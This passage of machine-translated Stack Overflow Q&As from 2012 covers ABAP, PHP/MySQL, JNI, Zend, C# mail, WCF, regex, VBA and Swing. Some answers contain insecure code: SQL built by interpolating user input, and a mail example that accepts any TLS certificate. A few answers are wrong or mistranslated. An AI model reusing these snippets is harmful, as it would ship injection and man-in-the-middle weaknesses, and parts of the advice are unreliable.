有一些参考手册可以从[官方网站](http://www.talend.com/download.php)下载。转到此链接后，转到`Data Integration`那里的选项卡，在页面底部您可以找到一个部分`User Documentation`。下载相应的 pdf。

我们从他们那里得到的帮助很少，但是一旦我们通过了这些材料，自我探索就会得到更好的结果。

# where-clause - 如何在 SELECT 中包含多个条件？

> ID：10597947
> 
> 赞同：3
> 
> 时间：2012-05-15T09:34:24.593
> 
> 标签：where-clause, abap, opensql, sap-selection-screens

我正在使用 5 个参数从数据库表（**mara、makt、marc、mard**）中获取详细信息。

```
 PARAMETERS :number TYPE matnr MATCHCODE OBJECT MAT1 ,
             type TYPE MTART MATCHCODE OBJECT H_T134 ,
             sector TYPE MBRSH MATCHCODE OBJECT H_T137 ,
             group TYPE MATKL MATCHCODE OBJECT H_T023 ,
             unit TYPE MEINS MATCHCODE OBJECT H_T006 . 
```

首先，我尝试使用**选择**查询从**MARA**表中获取数据。为了检索特定记录，我必须使用**WHERE**条件。但我对条件部分感到困惑。我们可以使用**INITIAL**条件检查哪个参数具有值。

 ******但是 2/3/4/5 参数有可能具有值。对于每种情况，我们都必须编写选择查询（如果这样会导致性能问题），或者有什么方法可以在选择查询中使用动态条件部分？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T17:50:12.293

您可以使用`SELECT-OPTIONS`：

```
TABLES MARA.  

SELECT-OPTIONS:
  s_matnr FOR mara-matnr MATCHCODE OBJECT MAT1 ,
  s_mtart FOR mara-MTART MATCHCODE OBJECT H_T134 ,
  s_mbrsh FOR mara-MBRSH MATCHCODE OBJECT H_T137 ,
  s_matkl FOR mara-MATKL MATCHCODE OBJECT H_T023 ,
  s_meins FOR mara-MEINS MATCHCODE OBJECT H_T006 .

* [...]  

SELECT * FROM MARA where 
  matnr in s_matnr and
  mtart in s_mtart and
  mbrsh in s_mbrsh and
  matkl in s_matkl and
  meins in s_meins. 
```

当您这样做时，您的选择屏幕将允许数据有多个值和范围。

如果您需要像`parameter`-command 这样的单个值，则必须为`SELECT-OPTION`:

*   `NO INTERVALS`只允许单个值
*   `NO-EXTENSION` 只允许一个值。
*   `OBLIGATORY`如果不允许空值（据我了解你的问题，你有相反的情况，所以你不需要它）。

所以你的选择是：

```
SELECT-OPTIONS:
  s_matnr FOR mara-matnr NO-EXTENSION NO INTERVALS,
  s_mtart FOR mara-MTART NO-EXTENSION NO INTERVALS,
  s_mbrsh FOR mara-MBRSH NO-EXTENSION NO INTERVALS,
  s_matkl FOR mara-MATKL NO-EXTENSION NO INTERVALS,
  s_meins FOR mara-MEINS NO-EXTENSION NO INTERVALS. 
```

评论：

*   `MARA``TABLE`如果您使用，则必须定义为`SELECT-OPTIONS`
*   你真的需要`MATCHCODE OBJECT`吗？通常使用`FOR`已经定义了正确的匹配码对象（通过数据元素/域）。

免责声明：

*   我还没有可用的 SAP 系统，所以代码可能包含语法错误。- 我明天会检查它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T17:51:08.593

我认为最简单的方法是使用`select-options`。然后，您可以将 select-option 值与`in`查询中的表达式一起使用。
这样，当值为空时，它将自动被忽略（当您在查询中使用空参数时不会发生这种情况），因此您不必`WHERE`为每个可能的组合创建单独的表达式。一个例子：

```
tables: mara.
select-options number for mara-matnr matchcode object mat1 no-extension no intervals.
select-options type for mara-mtart matchcode object h_t134 no-extension no intervals.
select-options sector for mara-mbrsh matchcode object h_t137 no-extension no intervals.
select-options group for mara-matkl matchcode object h_t023 no-extension no intervals.
select-options unit for mara-meins matchcode object h_t006 no-extension no intervals.

select distinct mara~matnr makt~maktx marc~werks mard~lgort into table ta_materials
  from mara
  inner join makt on makt~matnr = mara~matnr
  inner join marc on marc~matnr = mara~matnr
  inner join mard on mard~matnr = mara~matnr
  where makt~spras = sy-langu and
        mara~matnr in number and
        mara~mtart in type and
        mara~mbrsh in sector and
        mara~matkl in group and
        mara~meins in unit
  order by mara~matnr. 
```

和选项将使选择选项在屏幕`no-extension`上`no intervals`表现得像一个参数（或多或少）。******

# php - 使用 PHP 在 MySQL 中搜索多个列

> ID：10597964
> 
> 赞同：2
> 
> 时间：2012-05-15T09:35:49.210
> 
> 标签：php, mysql, search

我在互联网上搜索了许多不同的方法，但找不到我的问题的答案。我正在自学网站开发，并正在尝试创建一个在线房地产网站。

当我尝试搜索房产时，我的问题出现了。例如，我想搜索特定区域或邮政编码中的所有属性。当我尝试搜索地址行 1、地址行 2、邮政编码和区域（如 London SW1V）等多个字段时。

以下是我目前正在使用的查询，并希望将其更改为我需要的工作方式：

```
SELECT property.propertyid, property.propertyname
FROM   property
WHERE  property.address_1 LIKE '%txtSearchField%'
    OR property.address_2 LIKE '%txtSearchField%'
    OR property.postcode  LIKE '%txtSearchField%'
    OR property.area      LIKE '%txtSearchField%' 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:43:07.550

它不是有效的方法，但最简单且适用于低流量页面：

```
SELECT property.propertyid, property.propertyname
FROM   property
WHERE  CONCAT(property.address_1, ' ',
              property.address_2, ' ',
              property.postcode, ' ',
              property.area) LIKE '%txtSearchField%' 
```

这应该适合你。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T10:03:39.510

在这个 SQL 查询构造中，无论它的值是什么`txtSearchField`（即使它是空的），您都会执行它。您还忘记了将美元符号 $ 放在此变量的前面，这`txtSearchField`就是为什么您无法从输入表单中获得任何结果的原因，因为您总是搜索文本`txtSearchField`，而不是变量的内容`$txtSearchField`。（我猜你使用了一个带有 HTML 文本输入的输入表单，称为`txtSearchField`）。请记住将 HTML 表单的方法设置为“post”，因为如果省略它，则默认为“get”。

如果我是对的，您应该以这种方式重新编写代码：

```
 <?php
    //Sanitize user input
    $txtSearchField = filter_var($_POST['txtSearchField'], FILTER_SANITIZE_STRING);
    //SQL query
    $query = "SELECT property.propertyid, property.propertyname
    FROM   property
    WHERE  CONCAT(property.address_1, ' ',
                  property.address_2, ' ',
                  property.postcode, ' ',
                  property.area) LIKE '%$txtSearchField%'" //see the $ sign here
//Finally, execute query and get result
$result = mysql_query ($query) or die ('SQL error occured: '.mysql_error());
while ($array = mysql_fetch_assoc($result)) {
  echo $result['address_1'].'/'.$result['address_2'].'/'.$result['postcode'].'/'.$result['area'].'<br/>';
}
    ?> 
```

# java - clsStr 变量是“clsStr = (*env)->NewGlobalRef(env,cls)”的全局变量是什么？

> ID：10597968
> 
> 赞同：1
> 
> 时间：2012-05-15T09:36:08.820
> 
> 标签：java, c, java-native-interface, global-variables

据说 JNI 中的全局引用是必须由程序员手动释放的引用。它与 c 上下文无关。所以像这样的代码：

```
{
    jclass clsStr = (*env)->NewGlobalRef(env,cls); 
}

return clsStr; 
```

会给出一个错误，说`clsStr`是 *undefined / undeclared*。我明白这一点。但我不明白的是这些类型的引用的**使用**。

`clsStr`上面代码中的全局是什么？这个变量在将来或调用返回后如何有用？我还读到*“基本上，全局引用对于确保它（及其内容）将在下一次 JNI 调用中继续存在”*但我不明白这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:48:24.987

这意味着您可以保留从`NewGlobalRef()`多次调用本机方法中获得的参考。在您明确调用`DeleteGlobalRef()`.

这与[本地参考](http://java.sun.com/docs/books/jni/html/refs.html)相反：

> 本地引用仅在创建它的本机方法的动态上下文中有效，并且仅在本机方法的一次调用中有效。在本地方法执行期间创建的所有本地引用将在本地方法返回后被释放。

如果在调用之前将全局引用存储在允许超出范围的变量中`DeleteGlobalRef()`，则会泄漏内存。下面是一个例子：

```
{
    jclass clsStr = (*env)->NewGlobalRef(env,cls); 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T23:46:23.103

> 据说 JNI 中的全局引用是必须由程序员手动释放的引用。它与 c 上下文无关。

不，不是。[这是对JNI Specification](http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/design.html#wp1242)的严重错误引用。这就是它真正所说的：

> JNI 将本机代码使用的对象引用分为两类：本地引用和全局引用。本地引用在本地方法调用期间有效，并在本地方法返回后自动释放。全局引用在被显式释放之前一直有效。

JNI 中的任何内容都不能改变 C 编程语言的语义。

# zend-framework - 在 bluehost 服务器上的 php.ini 中包含 Zend Framework 库

> ID：10597971
> 
> 赞同：0
> 
> 时间：2012-05-15T09:36:12.317
> 
> 标签：zend-framework, deployment, bluehost

我无法在 Bluehost 服务器上正确设置 ZF 库的包含路径。

这是目录结构：

```
/root_directory

 .htaccess

 __/Zend

 __Application(from ZF)

 __library(from ZF)

 __/public_html

    __/public(the ZF public folder) 
```

我从公用文件夹中删除了 .htaccess 并将其放在 root_directory 中。

.htaccess 的内容：

```
RewriteEngine On

RewriteRule ^.htaccess$ - [F]
RewriteCond %{REQUEST_URI} =""
RewriteRule ^.*$ /public/index.php [NC,L]

RewriteCond %{REQUEST_URI} !^/public/.$
RewriteRule ^(.)$ /public/$1
RewriteCond %{REQUEST_FILENAME} -f
RewriteRule ^.*$ - [NC,L] 
```

RewriteRule ^public/.*$ /public/index.php [NC,L]

公共文件夹中 index.php 的内容：

```
// Define path to application directory
defined('APPLICATION_PATH')
    || define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/../application'));

// Define application environment
defined('APPLICATION_ENV')
    || define('APPLICATION_ENV', (getenv('APPLICATION_ENV') ?  getenv('APPLICATION_ENV') : 'production'));

// Ensure library/ is on include_path
set_include_path(implode(PATH_SEPARATOR, array(
    realpath(APPLICATION_PATH . '/../library'),
    get_include_path(),
)));

/** Zend_Application */
require_once 'Zend/Application.php';

// Create application, bootstrap, and run
$application = new Zend_Application(
    APPLICATION_ENV,
    APPLICATION_PATH . '/configs/application.ini'
);
$FrontController = Zend_Controller_Front::getInstance();
$Router=$FrontController->getRouter();

  Zend_Layout::startMvc(array(
    "layout" => "layout",
    "layoutPath" => "layouts/scripts"
    ));

$plugin=new Zend_Controller_Plugin_ErrorHandler();
$plugin->setErrorHandler(array("controller" =>'ApplicationError',
                               "action"=>'index'));
$FrontController->registerPlugin($plugin);

$application->bootstrap()
            ->run(); 
```

请帮助我在服务器上部署我的项目。如果还有什么我需要提及的，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T21:44:33.653

看看执行以下操作是否能让您启动并运行：

*   将内容`public_html/public`移入`public_html`并删除`public`文件夹
*   删除`root_directory/.htaccess`
*   创造`public_html/.htaccess`

在`public_html/.htaccess`中，输入：

```
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^.*$ - [NC,L]
RewriteRule ^.*$ index.php [NC,L] 
```

*   您的`index.php`文件看起来不错，无需更改`APPLICATION_PATH`.

Basically, the only change is that instead of actually using the `public` folder that came with Zend Framework, you replace it with `public_html` instead since that is really your public folder.

# c# - 使用 kinect（c# 和 wpf）从深度图像中检测指尖

> ID：10597974
> 
> 赞同：2
> 
> 时间：2012-05-15T09:36:39.580
> 
> 标签：c#, wpf, detection, kinect, depth

我正在为我的大学制作一个项目，我正在使用 kinect，我想使用 microsoft sdk 检测指尖。我根据最近的对象和播放器进行了深度分割，所以现在我的图像中只有手部. 但我不知道下一步该做什么。我试图得到手的边界，但没有找到方法来做到这一点。所以任何人都可以帮助我并提出一些有用的方法或想法来做到这一点。我正在使用 c# 和 wpf 如果有人可以提供示例代码，那就太好了。我只想检测食指和拇指。提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T19:40:46.970

顺便说一句，关于找到边界。想想这个。Kinect 为您提供手的位置。你的手在某个 Z 位置。这是与 Kinect 设备的距离。现在，您手的每个像素（来自深度流）几乎都在与您的手连接处相同的 Z 位置。你的边界将是一个比你的手在背景中更多的像素。通过这种方式，您可以为您的手在各个方向设置界限。您只需要分析像素数据希望它有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T12:47:08.920

试试[这个下载](http://candescentnui.codeplex.com/releases/view/69916)，它是Kinect手指检测，在页面上得到“推荐”下载，我发现里面的`.dll`s很好用。祝你好运！

# c# - 用户控制 PostBack URL 问题

> ID：10597976
> 
> 赞同：0
> 
> 时间：2012-05-15T09:36:43.407
> 
> 标签：c#, asp.net, user-controls, postbackurl

在我的项目中，我创建了用户控件并将其动态加载到占位符中。但是现在我遇到了 PostBack URL 问题。

我需要将值从用户控件传递到其他页面到其他页面。

请在下面查看我的代码

这是我的前端用户控件

```
<div class="rightColumnModule2TitleContainer">
<table class="rightColumnModule2Table">
    <tr>
        <td>
            <div class="rightColumnModule2Title">Contact Person</div>
        </td>
    </tr>
    <tr>
        <td>
            <asp:Button ID="Button1" runat="server" Text="Button"  PostBackUrl="~/Module/Sales/Customer/CreateContactListing.aspx"/>

        </td>
    </tr>
</table> 
```

在我的另一个页面

```
 protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (!Page.IsPostBack)
            {
                if (PreviousPage.IsCrossPagePostBack)
                {

                }
             }
        }
        catch (Exception ex)
        {
            logger.Error(ex.Message);
            throw;
        }
    } 
```

我在**(PreviousPage.IsCrossPagePostBack)上遇到错误**

这是我的错误

`Unable to cast object of type 'ASP.module_sales_customer_createsalescustomer_aspx' to type 'LewreERP_MixsolProject.Module.Sales.Customer.SalesCustomerListing'.`

请指导我。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:43:50.797

首先，您需要检查 PreviousPage 是否为 null。

```
 if (Page.PreviousPage != null && Page.PreviousPage.IsCrossPagePostBack)
 {
 } 
```

看看这篇[文章](http://brijbhushan.net/2011/07/30/iscrosspagepostback-cross-page-postback/)。它使用用户控件有效地解释了 PreviousPage.IsCrossPagePostBack。

# c# - 从使用 C# 接口定义的 WCF 合同创建 WSDL 和 XSD

> ID：10597980
> 
> 赞同：0
> 
> 时间：2012-05-15T09:37:10.193
> 
> 标签：c#, asp.net, .net, wcf, web-services

我有 WCF 服务。服务的契约是使用接口定义的。尚未创建实现。我需要创建与合同相对应的 WSDL 和 XSD。我将把生成的 wsdl 交付给我的团队成员。他们必须能够从 wsdl 创建接口并创建服务。从用作合同的 C# 接口创建 wsdl 和 xsd的**方法/工具是什么？**另外，如何从 WSDL 创建接口？我需要向开发人员提供 xsd 和 wsdl 还是只提供 WSDL？

**WSDL互操作性**的最佳方法是什么？

注意：我有两个服务。一种是使用数据合同。第二个使用消息契约。

注意：我使用的是 Visual Studio 2010 和 .NEt 4.0

* * *

阅读：-

1.  [从 XSD 文件生成 WSDL](https://stackoverflow.com/questions/920086/generating-a-wsdl-from-a-xsd-file)

2.  [能否结合来自 WCF 服务的 WSDL 和 XSD 数据？](https://stackoverflow.com/questions/1589598/can-you-combine-the-wsdl-and-xsd-data-from-a-wcf-service)

3.  [我可以使用什么工具来合并 wsdl 和 xsd 文件？](https://stackoverflow.com/questions/2627749/what-tool-can-i-use-to-merge-wsdl-and-xsd-file)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:50:50.250

提供 WSDL 就足够了，因为 WSDL 将使用 import 属性引用 xsd。

在为 WCF 服务定义绑定时，请确保使用可互操作的 BasicHttpBinding（遵循 BasicProfile 1.1）。

此外，您会考虑扁平化您的 WSDL 以使您的服务具有高度互操作性，因为有时 php 和其他 java 客户端可能需要扁平化 wsdl。如果您使用的是 .NET 4.5，那么您现在可以将其作为内置选项，否则您可以查看此链接以[了解如何扁平化您的 wsdl](http://weblogs.thinktecture.com/cweyer/2007/05/improving-wcf-interoperability-flattening-your-wsdl.html)

# asp.net - 如何使用 C# 在 Asp.net 中发送邮件

> ID：10597981
> 
> 赞同：0
> 
> 时间：2012-05-15T09:37:11.420
> 
> 标签：asp.net, email

> **可能重复：**
> [由于目标机器主动拒绝，无法建立连接？](https://stackoverflow.com/questions/2972600/no-connection-could-be-made-because-the-target-machine-actively-refused-it)

我在 Asp.net 中发送邮件时遇到严重问题，如果有人知道，请告诉我解决方案。这是我发送邮件的代码

```
MailMessage mm = new MailMessage();

        SmtpClient smtp = new SmtpClient();

        mm.From = new MailAddress(txtfrom.Text);

        mm.To.Add(new MailAddress(txtto.Text));

        mm.Subject = txtsubject.Text;

        mm.Body = txtmessage.Text;

        mm.IsBodyHtml = true;

        smtp.Host = "smtp.gmail.com"; //You can add this in the webconfig

        smtp.EnableSsl = true;

        System.Net.NetworkCredential NetworkCred = new System.Net.NetworkCredential();

        NetworkCred.UserName = "mymail@gmail.com";

        NetworkCred.Password = "my password";
        smtp.UseDefaultCredentials = true;

        smtp.Credentials = NetworkCred;

        smtp.Port = 587; //this is Gmail port for e-mail

        smtp.Send(mm);//send an e-mail 
```

问题是当我点击发送按钮时它显示以下错误

> “无法建立连接，因为目标机器主动拒绝它 173.194.79.109:587”

请告诉我解决方案..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:43:47.800

您需要将属性设置为**false**`UseDefaultCredentials`。

```
smtp.UseDefaultCredentials = false; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:44:01.660

该错误消息通常意味着防火墙阻止了您的连接。不要使用您的机器名称`"173.194.79.109:587"`，而是尝试使用“ `localhost`”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T10:41:28.943

这是我检查发送邮件的功能......它工作正常。

`

```
 private static bool testsendemail(MailMessage messageBody)
    {

        try

        {

        MailMessage message1 = new MailMessage();

        SmtpClient smtpClient = new SmtpClient();

        string msg = string.Empty;

        MailAddress fromAddress = new MailAddress("FromMail@Test.com");
        message1.From = fromAddress;
        message1.To.Add("ToMail@Test1.com");
        message1.Subject = "This is Test mail";
        message1.IsBodyHtml = true;
        message1.Body ="You can write your body here"+messageBody;
        smtpClient.Host = "smtp.mail.yahoo.com"; // We use yahoo as our smtp client
        smtpClient.Port = 587;
        smtpClient.EnableSsl = false;
        smtpClient.UseDefaultCredentials = true;
        smtpClient.Credentials = new  System.Net.NetworkCredential("SenderMail@yahoo.com", "YourPassword");

        smtpClient.Send(message1);
    }
    catch
    {
        return false;
    }
    return true;

}` 
```

谢谢你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T09:55:32.223

这就是我使用它的方式。

```
SmtpClient gglClient = new SmtpClient("173.194.67.108", 587);
gglClient.UseDefaultCredentials = false;
gglClient.DeliveryMethod = SmtpDeliveryMethod.Network;
gglClient.Credentials = new NetworkCredential("username@gmail.com", "password");
gglClient.EnableSsl = true;

MailMessage msg = new MailMessage("", email);
msg.Subject = "";
msg.Body = @" ";

msg.IsBodyHtml = false;
msg.BodyEncoding = UTF8Encoding.UTF8;

gglClient.Timeout = 8000;
ServicePointManager.ServerCertificateValidationCallback =
    delegate(object s, X509Certificate certificate, X509Chain chain,
        SslPolicyErrors sslPolicyErrors) { return true; };

gglClient.Send(msg); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T10:18:08.680

```
 protected void SendMail_Click(object sender, EventArgs e)
    {
        var fromAddress = new MailAddress(fromid.Text, fromname.Text);
        var toAddress = new MailAddress(toid.Text, toname.Text);
        string fromPassword = pswd.Text;
        string subject = subjectbox.Text;
         string body = bodybox.Text;

        var smtp = new SmtpClient
        {
            Host = "smtp.gmail.com",
            Port = 587,
            EnableSsl = true,
            DeliveryMethod = SmtpDeliveryMethod.Network,
            Credentials = new NetworkCredential(fromAddress.Address, fromPassword),
            Timeout = 20000
        };
        using (var message = new MailMessage(fromAddress, toAddress)
        {
            Subject = subject,
            Body = body,
            IsBodyHtml = false

        })
        {
            smtp.Send(message);
        }

    } 
```

# mysql - 更改 SQL 表 - 允许 NULL 列值

> ID：10597982
> 
> 赞同：24
> 
> 时间：2012-05-15T09:37:17.540
> 
> 标签：mysql, sql, alter

最初，表“MyTable”已按以下方式定义：

```
CREATE TABLE IF NOT EXISTS `MyTable` (
  `Col1` smallint(6) NOT NULL AUTO_INCREMENT,
  `Col2` smallint(6) DEFAULT NULL,
  `Col3` varchar(20) NOT NULL,
); 
```

如何以允许“Col 3”列为 NULL 的方式更新它？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-05-15T09:39:32.827

```
ALTER TABLE MyTable MODIFY Col3 varchar(20) NULL; 
```

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2012-05-15T09:41:02.407

以下 MySQL 语句应修改您的列以接受 NULL。

```
ALTER TABLE `MyTable`
ALTER COLUMN `Col3` varchar(20) DEFAULT NULL 
```

# sql - 异常查询抛出 ORA-00942: 表或视图不存在

> ID：10597986
> 
> 赞同：1
> 
> 时间：2012-05-15T09:37:25.387
> 
> 标签：sql, scala, anorm

我创建了一个案例类和一个伴随对象来执行查询，如下所示：

```
case class Instruction(caseid:Long, day:String, period:String)

object Instruction{

val rt = {
  get[Long]("caseid") ~
  get[String]("day") ~
  get[String]("period") map{
    case caseid~day~period => RealTimeInstruction(caseid, day,period) 
  }  
}

 def findAll(date:String):List[RealTimeInstruction]={

DB.withConnection{
  implicit c => SQL("""
        select
        unit.CASEID "CASEID",
        to_char(c.GETLOCALDATE(unit.START_TIME), 'DD-MON-YY') as "DAY", 
        case when to_char(c.GETLOCALDATE(unit.START_TIME), 'HH24') LIKE '0%'
        then to_number(substr(to_char(c.GETLOCALDATE(unit.START_TIME), 'HH24'),2))
        else to_number(to_char(c.GETLOCALDATE(unit.START_TIME), 'HH24'))
        end  "PERIOD"
        from unit, entity_def, entity
        ........
      """).on('date->date).as(rt *) 
}
 }

} 
```

执行 findAll 产生 ORA-00942：表或视图不存在

查询 h wever 工作正常。我猜这与期望在数据库中找到指令表的异常框架有关。

我基本上想要做的是在异常中执行参数化查询并检索和解析结果。

我该怎么做呢？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:40:50.847

知道了。

您只需从播放配置文件中禁用进化插件。

只需添加到配置中：

进化插件=禁用

# objective-c - Objective-c 中的正则表达式无法按预期工作

> ID：10597987
> 
> 赞同：4
> 
> 时间：2012-05-15T09:37:25.967
> 
> 标签：objective-c, regex, xcode, unit-testing, nsregularexpression

我使用正则表达式检查密码。但它没有按预期工作。我使用一些单元测试来检查正则表达式。

```
@implementation NSString (regexMatch)

- (BOOL)matchesRegex:(NSString *)regexPattern
{
    NSError *error = nil;

    NSRegularExpression* regex = [NSRegularExpression
                                  regularExpressionWithPattern:regexPattern 
                                  options:NSRegularExpressionSearch
                                  error:&error];

    if(error) 
    {
        NSLog(@"Error on maches regex: %@ on %@: %@", regex, self, error);
        return NO;
    }

    NSUInteger maches = [regex numberOfMatchesInString:self 
                                               options:NSRegularExpressionSearch 
                                                 range:NSMakeRange(0, [self length])];

    return (maches > 0);
}

@end 
```

正则表达式：

```
const static NSString *REGEX_VALID_PASS = @"(^((?=.*\\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[-_,.@#$%'\"]).{6,20})$)"; 
```

单元测试：

```
//Password 
// At least:
//  - between 6 and 20 chars
//  - a capital character
//  - a small character
//  - a digit
//  - a special char: - _ , . @ # $ % ´ '
STAssertTrue([@"Pass1-" matchesRegex:REGEX_VALID_PASS], @"Password 1 failed");

STAssertTrue([@"aPrettyLongPassw0rd@" matchesRegex:REGEX_VALID_PASS], @"Password 2 failed");

STAssertTrue([@"Pw987321-_,.@#$%'`" matchesRegex:REGEX_VALID_PASS], @"Password 3 failed");

//Returns TRUE ???
STAssertFalse([@"password1@" matchesRegex:REGEX_VALID_PASS], @"Wrong password 4 works (No capital letter)");

//Returns TRUE ???
STAssertFalse([@"PASSWORD2#" matchesRegex:REGEX_VALID_PASS], @"Wrong password 5 works (No small letter)");

STAssertFalse([@"Password8" matchesRegex:REGEX_VALID_PASS], @"Wrong password 6 works (No special letter)");

STAssertFalse([@"Password$" matchesRegex:REGEX_VALID_PASS], @"Wrong password 7 works (No digit letter)");

STAssertFalse([@"PrettyLongPasswordIsWrong123#" matchesRegex:REGEX_VALID_PASS], @"Wrong password 8 works (> 20)");

STAssertFalse([@"Pw@3" matchesRegex:REGEX_VALID_PASS], @"Wrong password 9 works (< 6)"); 
```

密码“password1@”和“PASSWORD2#”返回 TRUE，但不正确。

错误：

```
file://localhost/Users/user/app/AppTest.m: error: testRegex (AppTest) failed: "[@"password1@" matchesRegex:REGEX_VALID_PASS]" should be false. Wrong password 4 works (No capital letter)

and

file://localhost/Users/user/app/AppTest.m: error: testRegex (AppTest) failed: "[@"PASSWORD2#" matchesRegex:REGEX_VALID_PASS]" should be false. Wrong password 5 works (No small letter) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:45:20.973

您指定`NSRegularExpressionCaseInsensitive`了选项，因此表达式不区分大小写字母是有意义的。

指定`NSRegularExpressionCaseInsensitive`选项后，`(?=.*[a-z])`将匹配任何字母，包括大写字母；同样，`(?=.*[A-Z])`也将匹配小写字母。

您失败的单元测试期望不同的行为：它们都检查密码是否包含大写和小写字母，而输入包含相同大小写的字母。

# excel - 需要添加粘贴特殊条件a copy.destination for 循环

> ID：10597988
> 
> 赞同：2
> 
> 时间：2012-05-15T09:37:28.710
> 
> 标签：excel, for-loop, copy-paste, vba

我有一系列数据在书中的每个工作表中处于相同位置，并且将始终处于该位置。运行宏时，应将数据复制并添加到报告表中。我有那部分工作，但我需要使用特殊粘贴：

```
.PasteSpecial xlPasteValues 
```

因为该范围内有公式。我不确定在此代码中的何处添加粘贴特殊条件，因为我使用的是`.Copy, Destination`.

```
Option Explicit
Sub CreateTempPSDReport()

    Dim WS As Worksheet, Rept As Worksheet

    Set Rept = Sheets("Temporary PSD Report")

    Application.ScreenUpdating = False

    '--> Loop through each worksheet except the report and
    '--> Copy the set range to the report
    For Each WS In ThisWorkbook.Worksheets
        If Not WS.Name = "Temporary PSD Report" Then
            WS.Range("A42", "I42").Rows.Copy _
            Destination:=Rept.Cells(Rows.Count, "A").End(xlUp).Offset(1, 0)
        End If
    Next

    Application.ScreenUpdating = True

End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:41:39.593

> > > ```
> > >  I need to use a paste special:
> > >        WS.Range("A42", "I42").Rows.Copy _
> > >        Destination:=Rept.Cells(Rows.Count, "A").End(xlUp).Offset(1, 0) 
> > > ```

在这种情况下，您不使用上述方法。你用这个

```
WS.Range("A42", "I42").Rows.Copy

Rept.Cells(Rows.Count, "A").End(xlUp).Offset(1, 0).PasteSpecial _
Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False 
```

# java - 显示 JPanel 调整大小的另一个 JPanel

> ID：10597989
> 
> 赞同：2
> 
> 时间：2012-05-15T09:37:30.253
> 
> 标签：java, swing, jpanel, boxlayout

我有一个关于嵌套 BoxLayouts 的问题。

我想构建一个由 2 个子面板组成的 DropDownPanel：顶部的标题和底部的正文。身体最初是隐藏的。通过单击标题，您可以切换正文的可见性并显示其内容（如展开/折叠）。

一般来说，这很好用。但是有一些奇怪的行为：
如果只有一个 DropDownPanel 展开而另一个折叠，则折叠的 DropDownPanel 会调整大小并向右浮动。

我已经尝试过 JPanel 的属性，如 alignmentX，但我找不到我的错误。有谁知道我做错了什么？

这是代码：
DropDownPanel.java

```
public class DropDownPanel extends javax.swing.JPanel {

    private boolean mShowContent = false;

    /**
     * Creates new form DropDownPanel
     */
    public DropDownPanel() {
        initComponents();
        showContent(mShowContent);
    }

    private void showContent(boolean showContent) {
        mShowContent = showContent;
        System.out.println(mShowContent? "show" : "hide");
        body.setVisible(mShowContent);
        revalidate();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel3 = new javax.swing.JPanel();
        header = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        body = new javax.swing.JPanel();
        jPanel5 = new javax.swing.JPanel();
        jLabel2 = new javax.swing.JLabel();

        setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
        setLayout(new javax.swing.BoxLayout(this, javax.swing.BoxLayout.Y_AXIS));

        jPanel3.setLayout(new javax.swing.BoxLayout(jPanel3, javax.swing.BoxLayout.Y_AXIS));

        header.setMaximumSize(new java.awt.Dimension(32000, 60));
        header.setMinimumSize(new java.awt.Dimension(0, 60));
        header.setPreferredSize(new java.awt.Dimension(0, 60));
        header.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                headerMouseClicked(evt);
            }
        });
        header.setLayout(new javax.swing.BoxLayout(header, javax.swing.BoxLayout.X_AXIS));

        jLabel1.setText("Click Me!");
        header.add(jLabel1);

        jPanel3.add(header);

        body.setLayout(new javax.swing.BoxLayout(body, javax.swing.BoxLayout.Y_AXIS));

        jPanel5.setLayout(new javax.swing.BoxLayout(jPanel5, javax.swing.BoxLayout.X_AXIS));

        jLabel2.setText("jLabel2");
        jPanel5.add(jLabel2);

        body.add(jPanel5);

        jPanel3.add(body);

        add(jPanel3);
    }// </editor-fold>//GEN-END:initComponents

    private void headerMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_headerMouseClicked
        System.out.println("asd");
        showContent(!mShowContent);
    }//GEN-LAST:event_headerMouseClicked
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JPanel body;
    private javax.swing.JPanel header;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel5;
    // End of variables declaration//GEN-END:variables
} 
```

测试框架.java

```
public class TestFrame extends javax.swing.JFrame {

    /**
     * Creates new form TestFrame
     */
